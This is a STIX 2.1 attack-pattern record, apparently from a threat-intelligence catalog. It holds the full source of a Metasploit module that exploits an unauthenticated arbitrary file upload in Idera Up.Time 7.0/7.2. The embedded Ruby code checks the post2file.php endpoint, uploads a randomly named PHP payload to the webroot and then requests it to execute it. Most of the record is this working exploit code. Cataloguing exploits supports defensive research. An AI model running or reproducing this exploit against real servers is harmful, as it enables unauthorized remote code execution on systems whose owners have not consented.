{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--51a73e83-89cd-42c5-8cd9-3387f2b7981a",
    "created": "2024-08-14T17:08:10.819511Z",
    "modified": "2024-08-14T17:08:10.819515Z",
    "name": "Idera Up.Time Monitoring Station 7.0 post2file.php Arbitrary File Upload",
    "description": " This module exploits an arbitrary file upload vulnerability found within the Up.Time monitoring server 7.2 and below. A malicious entity can upload a PHP file into the webroot without authentication, leading to arbitrary code execution.  Although the vendor fixed Up.Time to prevent this vulnerability, it was not properly mitigated. To exploit against a newer version of Up.Time (such as 7.4), please use exploits/multi/http/uptime_file_upload_2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/uptime_file_upload_1.rb",
            "external_id": "uptime_file_upload_1.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.security-assessment.com/files/documents/advisory/Up.Time%207.2%20-%20Arbitrary%20File%20Upload.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Idera Up.Time Monitoring Station 7.0 post2file.php Arbitrary File Upload',\n      'Description'    => %q{\n          This module exploits an arbitrary file upload vulnerability found within the Up.Time\n          monitoring server 7.2 and below. A malicious entity can upload a PHP file into the\n          webroot without authentication, leading to arbitrary code execution.\n\n          Although the vendor fixed Up.Time to prevent this vulnerability, it was not properly\n          mitigated. To exploit against a newer version of Up.Time (such as 7.4), please use\n          exploits/multi/http/uptime_file_upload_2.\n      },\n      'Author'         =>\n        [\n          'Denis Andzakovic <denis.andzakovic[at]security-assessment.com>' # Vulnerability discoverey and MSF module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '100423' ],\n          [ 'BID', '64031'],\n          [ 'URL', 'http://www.security-assessment.com/files/documents/advisory/Up.Time%207.2%20-%20Arbitrary%20File%20Upload.pdf' ]\n        ],\n      'Payload'            =>\n        {\n          'Space' => 10000, # just a big enough number to fit any PHP payload\n          'DisableNops' => true\n        },\n      'Platform'       => 'php',\n      'Arch'         => ARCH_PHP,\n      'Targets'        =>\n        [\n          [ 'Up.Time 7.0/7.2', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-11-19'))\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The full URI path to the Up.Time instance', '/']),\n      Opt::RPORT(9999)\n    ])\n  end\n\n  def check\n    uri =  target_uri.path\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, 'wizards', 'post2file.php')\n    })\n\n    if res and res.code == 500 and res.body.to_s =~ /<title><\\/title>/\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n\n  end\n\n  def exploit\n    print_status(\"Uploading PHP to Up.Time server\")\n    uri =  target_uri.path\n\n    @payload_name = \"#{rand_text_alpha(5)}.php\"\n    php_payload = get_write_exec_payload(:unlink_self => true)\n\n    post_data = ({\n      \"file_name\" => @payload_name,\n      \"script\" => php_payload\n    })\n\n    print_status(\"Uploading payload #{@payload_name}\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, 'wizards', 'post2file.php'),\n      'vars_post'   => post_data,\n    })\n\n    unless res and res.code == 200 and res.body.to_s =~ /<title><\\/title>/\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Upload failed\")\n    end\n\n    print_status(\"Executing payload #{@payload_name}\")\n    res = send_request_cgi({\n      'uri'    => normalize_uri(uri, 'wizards', @payload_name),\n      'method' => 'GET'\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-11-19",
    "x_mitre_platforms": [
        "php'"
    ]
}